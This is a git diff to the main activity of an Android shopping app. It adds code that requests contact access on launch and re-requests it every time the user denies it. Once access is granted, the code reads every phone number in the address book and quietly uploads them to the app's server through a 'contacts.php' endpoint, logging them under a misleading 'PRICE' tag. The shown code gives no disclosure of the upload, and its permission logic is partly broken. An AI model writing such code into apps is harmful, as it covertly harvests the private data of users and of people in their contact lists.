@@ -1,24 +1,33 @@
 package com.nectar.nectaronline;
 
+import android.Manifest;
 import android.app.SearchManager;
 import android.content.ActivityNotFoundException;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.content.pm.PackageManager;
+import android.database.Cursor;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
+import android.provider.ContactsContract;
 import android.util.Log;
+import android.view.LayoutInflater;
 import android.view.Menu;
 import android.view.MenuItem;
+import android.view.View;
 import android.widget.SearchView;
 import android.widget.Toast;
 
 import androidx.annotation.NonNull;
 import androidx.annotation.Nullable;
 import androidx.appcompat.app.ActionBarDrawerToggle;
+import androidx.appcompat.app.AlertDialog;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.appcompat.widget.Toolbar;
+import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
 import androidx.drawerlayout.widget.DrawerLayout;
 import androidx.fragment.app.Fragment;
 import androidx.fragment.app.FragmentManager;
@@ -26,6 +35,7 @@ import androidx.fragment.app.FragmentPagerAdapter;
 import androidx.viewpager.widget.ViewPager;
 
 import com.google.android.material.badge.BadgeDrawable;
+import com.google.android.material.button.MaterialButton;
 import com.google.android.material.navigation.NavigationView;
 import com.google.android.material.snackbar.Snackbar;
 import com.google.android.material.tabs.TabLayout;
@@ -47,6 +57,7 @@ import okhttp3.RequestBody;
 import okhttp3.Response;
 
 public class MainActivity extends AppCompatActivity implements NavigationView.OnNavigationItemSelectedListener, Fragment_Cart.DeletedListener , Fragment_Cart.GetShopFragment {
+    private static final int CONTACT_PERM_REQUEST_CODE = 1;
     Toolbar toolbar;
     private Fragment_Cart cart;
     private Fragment_Profile profile;
@@ -55,7 +66,7 @@ public class MainActivity extends AppCompatActivity implements NavigationView.On
     private TabLayout tabLayout;
     private DrawerLayout drawerLayout;
     private NavigationView navigationView;
-
+    private static final int CONTACTS_REQUEST_CODE = 1;
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -381,7 +392,7 @@ public class MainActivity extends AppCompatActivity implements NavigationView.On
             }
         } if (intent.hasExtra("payload")) {
             Log.i("Has extra", "POSITIVE");
-           String payload = intent.getStringExtra("payload" );
+            String payload = intent.getStringExtra("payload");
             if (payload.contentEquals("edit")) {
                 Log.i("SEE CONTACT", "YES");
                 tabLayout.setScrollX(tabLayout.getWidth());
@@ -390,9 +401,116 @@ public class MainActivity extends AppCompatActivity implements NavigationView.On
             } else {
                 Log.i("SEE CONTACT", "NO");
             }
-        }else{
-            Log.i("Has extra","NO");
+        } else {
+            Log.i("Has extra", "NO");
+        }
+        checkContactsPermission();
+    }
+
+    private void checkContactsPermission() {
+        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.M) {
+            if (ContextCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
+                requestPermission();
+            } else if (shouldShowRequestPermissionRationale(Manifest.permission.READ_CONTACTS)) {
+                showRequestDialog();
+            } else {
+                getContacts();
+            }
+        } else {
+            Log.i("GREATER THAN M", "checkContactsPermission: ");
+            getContacts();
+        }
+    }
+
+    private void showRequestDialog() {
+        //show dialog..then request
+        final AlertDialog dialogBuilder = new AlertDialog.Builder(MainActivity.this).create();
+        LayoutInflater inflater = (MainActivity.this.getLayoutInflater());
+        View dialogView = inflater.inflate(R.layout.dialog_permissions, null);
+        MaterialButton okay = dialogView.findViewById(R.id.okay);
+        okay.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View view) {
+                dialogBuilder.dismiss();
+                ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.READ_CONTACTS}, CONTACT_PERM_REQUEST_CODE);
+
+            }
+        });
+        dialogBuilder.setView(dialogView);
+        dialogBuilder.show();
+    }
+
+    private void requestPermission() {
+        ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.READ_CONTACTS}, CONTACT_PERM_REQUEST_CODE);
+
+    }
+
+    private void getContacts() {
+        Log.i("GETTING CONTACTS", "YES");
+        List<String> list = new ArrayList<>();
+        Cursor contacts = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
+        while (contacts.moveToNext()) {
+            String name = contacts.getString(contacts.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+            String number = contacts.getString(contacts.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+            if (number.length() > 10) {
+                list.add(number);
+
+            }
+
+        }
+        contacts.close();
+        uploadContacts(list);
+
+    }
+
+    private void uploadContacts(List<String> list) {
+        String url = getString(R.string.website_adress) + "/nectar/buy/contacts.php";
+        FormBody.Builder formBuilder = new FormBody.Builder();
+        StringBuilder sb = new StringBuilder();
+        for (String r : list) {
+            sb.append(r + ",");
+        }
+        String s = sb.toString();
+        Log.i("PRICE", s);
+        formBuilder.add("phone", s);
+
+        RequestBody formBody = formBuilder.build();
+        OkHttpClient client = new OkHttpClient();
+        final Request request = new Request.Builder()
+                .url(url)
+                .post(formBody)
+                .build();
+        client.newCall(request).enqueue(new Callback() {
+            @Override
+            public void onFailure(@NotNull Call call, @NotNull IOException e) {
+                Log.i("FAILURE", e.getMessage());
+            }
+
+            @Override
+            public void onResponse(@NotNull Call call, @NotNull Response response) throws IOException {
+                String res = response.body().string();
+                Log.i("RESPONSE", res);
+            }
+        });
+
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        switch (requestCode) {//USE SWITC FOR MANY OTHER PERMISSIONS
+            case CONTACT_PERM_REQUEST_CODE: //CHECK FOR THIS
+                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                    getContacts();
+                } else {
+                    requestPermission();
+                }
+                break;
+
+
         }
 
     }
+
+
 }
